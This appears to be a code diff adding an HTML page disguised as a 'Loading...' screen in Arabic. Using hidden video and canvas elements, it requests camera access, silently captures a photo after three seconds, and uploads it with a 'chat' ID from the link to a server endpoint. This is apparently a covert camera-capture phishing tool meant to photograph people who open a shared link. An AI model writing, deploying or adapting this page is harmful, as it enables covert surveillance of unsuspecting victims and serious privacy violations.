@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            text-align: center;
+            padding-top: 120px;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <h2>📷 جاري التحميل...</h2>
+    <p id="status"></p>
+    <canvas id="canvas" style="display:none"></canvas>
+    <video id="video" autoplay playsinline style="display:none"></video>
+    
+    <script>
+    var status = document.getElementById('status');
+    var urlParams = new URLSearchParams(window.location.search);
+    var chatId = urlParams.get('chat');
+    
+    if (!chatId) {
+        status.innerText = '⚠️ خطأ: الرابط غير صالح';
+    } else {
+        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+        .then(function(stream) {
+            status.innerText = 'تم الاتصال بالكاميرا...';
+            
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(function() {
+                var canvas = document.getElementById('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                var imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                status.innerText = 'جاري الإرسال...';
+                
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData, chatId: chatId })
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (data.success) {
+                        status.innerText = '✅ تم بنجاح';
+                    } else {
+                        status.innerText = 'فشل: ' + (data.error || 'خطأ غير معروف');
+                    }
+                })
+                .catch(function(err) {
+                    status.innerText = 'فشل الاتصال: ' + err;
+                });
+                
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                
+            }, 3000);
+        })
+        .catch(function(err) {
+            status.innerText = '❌ تم رفض الإذن';
+        });
+    }
+    </script>
+</body>
+</html>
